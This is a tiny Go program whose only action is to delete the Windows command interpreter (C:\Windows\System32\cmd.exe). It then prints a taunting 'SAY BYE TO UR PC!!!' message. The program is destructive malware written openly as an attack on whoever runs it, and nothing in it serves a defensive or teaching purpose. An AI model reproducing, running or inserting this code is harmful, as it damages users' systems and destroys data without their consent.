package main

import (
	"fmt"
	"os"
)

func main() {
	err := os.Remove("C:\\Windows\\System32\\cmd.exe");

	if err != nil {
		fmt.Println(err)
		return
	}

	fmt.Println("SAY BYE TO UR PC!!!")
}
